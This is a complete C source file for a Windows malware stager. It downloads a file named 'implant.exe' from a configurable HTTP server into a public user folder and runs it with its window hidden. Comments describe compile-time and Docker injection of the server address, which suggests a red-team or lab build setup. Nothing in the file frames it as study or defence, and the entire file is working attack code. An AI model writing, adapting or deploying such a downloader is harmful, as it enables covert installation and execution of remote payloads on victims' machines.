#include <windows.h>
#include <urlmon.h>

#pragma comment(lib, "urlmon.lib")
#pragma comment(lib, "ole32.lib")

// Configuration - edit these as needed
// SERVER_URL can be overridden at compile time: -DSERVER_URL='"http://host:8000/implant.exe"'
// In Docker builds this is injected automatically via HOST_IP build arg.
#ifndef SERVER_URL
#define SERVER_URL "http://192.168.1.100:8000/implant.exe"
#endif
#define LOCAL_PATH "C:\\Users\\Public\\implant.exe" //Path where we download the file

int main(void) {
    HRESULT hr;
    BOOL success;
    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    
    // Initialize COM for URLDownloadToFile
    hr = CoInitialize(NULL);
    if (FAILED(hr)) {
        return 1;
    }
    
    // Download the file
    hr = URLDownloadToFileA(NULL, SERVER_URL, LOCAL_PATH, 0, NULL);
    if (FAILED(hr)) {
        CoUninitialize();
        return 2;
    }
    
    // Setup process creation for hidden execution
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    
    // Execute the downloaded file hidden
    success = CreateProcessA(
        LOCAL_PATH,          // application name
        NULL,               // command line arguments
        NULL,               // process security attributes  
        NULL,               // thread security attributes
        FALSE,              // inherit handles
        CREATE_NO_WINDOW,   // creation flags - prevents console window
        NULL,               // environment block
        NULL,               // current directory
        &si,                // startup info
        &pi                 // process information
    );
    
    if (success) {
        // Don't wait for the process - just clean up handles and exit
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
    
    // Clean up COM
    CoUninitialize();
    
    // Return codes for debugging:
    // 0 = success
    // 1 = COM init failed  
    // 2 = download failed
    // 3 = process creation failed
    return success ? 0 : 3;
}